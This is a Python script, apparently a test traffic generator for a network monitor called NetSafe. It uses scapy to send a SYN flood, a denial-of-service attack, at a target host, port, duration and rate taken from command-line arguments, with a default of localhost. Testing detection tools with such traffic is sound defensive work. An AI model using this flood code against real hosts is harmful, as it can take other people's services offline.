#!/usr/bin/env python3
"""
Cross-platform DDoS generator that sends raw packets.
Works with Npcap/WinPcap on Windows, libpcap on Linux.
"""
import sys
import time
from scapy.all import IP, TCP, send, RandShort
import random

def generate_ddos(target_ip="127.0.0.1", target_port=80, duration=30, packet_rate=100):
    """
    Generate DDoS traffic (SYN flood).
    
    Args:
        target_ip: Target IP address
        target_port: Target port
        duration: Duration in seconds
        packet_rate: Packets per second
    """
    print(f"""
╔════════════════════════════════════════════════════════╗
║          NetSafe DDoS Traffic Generator                ║
╠════════════════════════════════════════════════════════╣
║ Target IP:        {target_ip}
║ Target Port:      {target_port}
║ Duration:         {duration} seconds
║ Packet Rate:      {packet_rate} packets/sec
║ Total Packets:    ~{duration * packet_rate} packets
╚════════════════════════════════════════════════════════╝
""")
    
    print("[*] Starting DDoS attack...")
    print("[*] NetSafe should be capturing traffic now")
    print("[*] Press Ctrl+C to stop\n")
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Send multiple packets per iteration
            for _ in range(packet_rate):
                # Create raw IP/TCP SYN packet
                src_port = RandShort()  # Random source port
                
                # Create packet
                packet = IP(dst=target_ip) / TCP(
                    sport=src_port,
                    dport=target_port,
                    flags="S"  # SYN flag only
                )
                
                # Send packet (verbose=0 to suppress output)
                send(packet, verbose=0)
                packet_count += 1
            
            # Calculate elapsed time and packets per second
            elapsed = time.time() - start_time
            pps = packet_count / elapsed if elapsed > 0 else 0
            
            # Print status every 100 packets
            if packet_count % 100 == 0:
                print(f"[+] {packet_count:6d} packets sent | {pps:8.1f} pps | {elapsed:.1f}s elapsed")
            
            # Small delay to control packet rate
            time.sleep(1.0 / packet_rate)
    
    except KeyboardInterrupt:
        print(f"\n[!] Attack stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    
    # Summary
    total_time = time.time() - start_time
    avg_pps = packet_count / total_time if total_time > 0 else 0
    
    print(f"""
╔════════════════════════════════════════════════════════╗
║                   Attack Summary                       ║
╠════════════════════════════════════════════════════════╣
║ Total Packets Sent:    {packet_count:8d}
║ Duration:             {total_time:8.2f} seconds
║ Average Rate:         {avg_pps:8.2f} packets/sec
║ Status:               ✅ Complete
╚════════════════════════════════════════════════════════╝
""")
    
    return True


if __name__ == "__main__":
    # Parse arguments
    target_ip = "127.0.0.1"
    target_port = 80
    duration = 30
    packet_rate = 100
    
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    if len(sys.argv) > 2:
        target_port = int(sys.argv[2])
    if len(sys.argv) > 3:
        duration = int(sys.argv[3])
    if len(sys.argv) > 4:
        packet_rate = int(sys.argv[4])
    
    print("[!] Running as administrator is required on Windows")
    print("[!] Make sure NetSafe is capturing live traffic\n")
    
    try:
        generate_ddos(target_ip, target_port, duration, packet_rate)
    except PermissionError:
        print("❌ ERROR: This script requires administrator privileges!")
        print("   Please run as Administrator:")
        print("   - Right-click cmd.exe → Run as Administrator")
        print("   - Then run this script again")
        sys.exit(1)
